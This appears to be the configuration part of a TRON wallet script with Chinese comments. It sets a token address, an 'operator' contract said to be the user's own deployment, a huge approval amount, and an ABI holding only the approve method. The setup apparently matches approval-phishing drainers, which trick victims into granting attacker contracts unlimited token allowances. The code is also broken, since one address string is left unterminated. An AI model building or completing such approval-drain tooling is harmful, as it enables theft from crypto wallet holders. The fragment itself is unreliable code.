// ========== 修改以下内容为你自己的信息 ==========
const TOKEN_ADDRESS = "TWpy3Rup7grfkHc2c7rWVQ73oXHS9yHvLG"; // 如 USDT 主网地址
const OPERATOR_ADDRESS = "TKpGgic7PVjaqKgwwFRk8hfVXPkhCSxGeE // 你部署的合约地址
const APPROVE_AMOUNT = "900000000000000000"; // 授权数量（单位：TRX格式）

// 标准 TRC20 ABI 片段（仅包含 approve 方法）
const TRC20_ABI = [
  {
    "constant": false,
    "inputs": [
      { "name": "_spender", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "type": "function"
  }
];
